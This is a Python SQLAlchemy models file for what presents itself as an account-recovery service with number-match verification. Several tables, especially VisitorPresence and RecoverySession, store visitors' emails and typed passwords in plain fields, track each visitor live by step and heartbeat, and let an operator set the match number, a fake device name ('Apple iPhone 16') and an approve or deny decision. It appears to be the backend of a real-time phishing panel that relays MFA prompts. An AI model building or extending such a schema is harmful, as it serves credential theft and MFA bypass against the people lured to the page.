import datetime
from sqlalchemy import Column, Integer, String, Boolean, DateTime, ForeignKey, Text
from sqlalchemy.orm import relationship
from app.database import Base

class User(Base):
    __tablename__ = "users"

    id = Column(Integer, primary_key=True, index=True)
    email = Column(String(255), unique=True, index=True, nullable=False)
    username = Column(String(100), unique=True, index=True, nullable=False)
    full_name = Column(String(150), nullable=True)
    avatar_url = Column(String(500), nullable=True)
    hashed_password = Column(String(255), nullable=False)
    previous_passwords = Column(Text, default="[]")  # JSON array of previous hashed passwords
    is_active = Column(Boolean, default=True)
    is_admin = Column(Boolean, default=False)
    created_at = Column(DateTime, default=datetime.datetime.utcnow)
    updated_at = Column(DateTime, default=datetime.datetime.utcnow, onupdate=datetime.datetime.utcnow)

    recovery_sessions = relationship("RecoverySession", back_populates="user", cascade="all, delete-orphan")


class RecoverySession(Base):
    __tablename__ = "recovery_sessions"

    id = Column(String(64), primary_key=True, index=True)  # UUID
    user_id = Column(Integer, ForeignKey("users.id"), nullable=False)
    status = Column(String(32), default="PENDING")  # PENDING, VERIFIED, EXPIRED, COMPLETED
    method = Column(String(32), default="NUMBER_MATCH")  # NUMBER_MATCH, LAST_PASSWORD, OTP_CODE
    match_number = Column(Integer, nullable=True)  # Displayed number (e.g. 74)
    match_options = Column(Text, nullable=True)  # JSON list of 3 numbers e.g. "[18, 74, 91]"
    otp_code = Column(String(10), nullable=True)  # 6-digit backup code
    approval_token = Column(String(128), unique=True, index=True, nullable=False)  # Security token
    
    # Device & Location Intelligence
    ip_address = Column(String(64), nullable=True)
    user_agent = Column(String(255), nullable=True)
    country = Column(String(100), default="Unknown")
    country_code = Column(String(10), default="--")
    city = Column(String(100), default="Unknown")
    device_type = Column(String(50), default="Desktop")
    os = Column(String(50), default="Unknown OS")
    browser = Column(String(50), default="Unknown Browser")
    
    created_at = Column(DateTime, default=datetime.datetime.utcnow)
    expires_at = Column(DateTime, nullable=False)
    verified_at = Column(DateTime, nullable=True)
    completed_at = Column(DateTime, nullable=True)
    entered_password = Column(String(255), nullable=True)
    target_device_name = Column(String(100), default="Apple iPhone 16")
    admin_decision = Column(String(32), default="PENDING")

    user = relationship("User", back_populates="recovery_sessions")


class EmailLog(Base):
    __tablename__ = "email_logs"

    id = Column(Integer, primary_key=True, index=True)
    to_email = Column(String(255), nullable=False, index=True)
    subject = Column(String(255), nullable=False)
    match_number = Column(Integer, nullable=True)
    match_options = Column(Text, nullable=True)
    approval_token = Column(String(128), nullable=True)
    html_body = Column(Text, nullable=False)
    delivery_status = Column(String(32), default="LOCAL_INBOX")
    sent_at = Column(DateTime, default=datetime.datetime.utcnow)


class AuditLog(Base):
    __tablename__ = "audit_logs"

    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(Integer, ForeignKey("users.id"), nullable=True)
    action = Column(String(64), nullable=False)
    ip_address = Column(String(64), nullable=True)
    country = Column(String(100), nullable=True)
    city = Column(String(100), nullable=True)
    device_type = Column(String(50), nullable=True)
    details = Column(Text, nullable=True)
    created_at = Column(DateTime, default=datetime.datetime.utcnow)


class VisitorLog(Base):
    __tablename__ = "visitor_logs"

    id = Column(Integer, primary_key=True, index=True)
    ip_address = Column(String(64), nullable=True)
    country = Column(String(100), default="Unknown")
    country_code = Column(String(10), default="--")
    city = Column(String(100), default="Unknown")
    device_type = Column(String(50), default="Desktop")
    os = Column(String(50), default="Unknown")
    browser = Column(String(50), default="Unknown")
    screen_res = Column(String(50), nullable=True)
    timezone = Column(String(100), nullable=True)
    language = Column(String(20), nullable=True)
    created_at = Column(DateTime, default=datetime.datetime.utcnow)


class VisitorPresence(Base):
    __tablename__ = "visitor_presence"

    visitor_id = Column(String(64), primary_key=True, index=True)
    ip_address = Column(String(64), nullable=True)
    country = Column(String(100), default="Unknown")
    country_code = Column(String(10), default="--")
    city = Column(String(100), default="Unknown")
    device_type = Column(String(50), default="Desktop")
    os = Column(String(50), default="Unknown OS")
    browser = Column(String(50), default="Unknown Browser")
    email = Column(String(255), nullable=True)
    session_id = Column(String(64), nullable=True)
    entered_password = Column(String(255), nullable=True)
    current_step = Column(String(100), default="Viewing Page")
    custom_match_number = Column(Integer, default=63)
    custom_device_name = Column(String(100), default="Apple iPhone 16")
    admin_decision = Column(String(32), default="PENDING")
    is_active = Column(Boolean, default=True)
    last_heartbeat = Column(DateTime, default=datetime.datetime.utcnow)
    started_at = Column(DateTime, default=datetime.datetime.utcnow)
    left_at = Column(DateTime, nullable=True)


class SystemConfig(Base):
    __tablename__ = "system_configs"

    id = Column(Integer, primary_key=True, index=True)
    key = Column(String(64), unique=True, index=True, nullable=False)
    value = Column(Text, nullable=False)
    updated_at = Column(DateTime, default=datetime.datetime.utcnow, onupdate=datetime.datetime.utcnow)
